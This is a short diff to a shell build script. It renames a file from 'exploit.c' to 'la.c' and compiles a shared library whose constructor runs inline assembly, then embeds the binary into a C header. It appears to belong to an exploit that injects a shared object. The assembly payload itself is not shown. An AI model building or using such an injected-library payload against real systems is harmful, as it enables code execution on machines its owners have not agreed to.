@@ -1,4 +1,4 @@
-cat > exploit.c << "EOF"
+cat > la.c << "EOF"
 static void __attribute__ ((constructor)) _init (void) {
     __asm__ __volatile__ (
     "addq $64, %rsp;"
@@ -37,5 +37,5 @@ static void __attribute__ ((constructor)) _init (void) {
     );
 }
 EOF
-gcc -fpic -shared -nostdlib -Os -s -o la.so exploit.c
+gcc -fpic -shared -nostdlib -Os -s -o la.so la.c
 xxd -i la.so > la.so.h
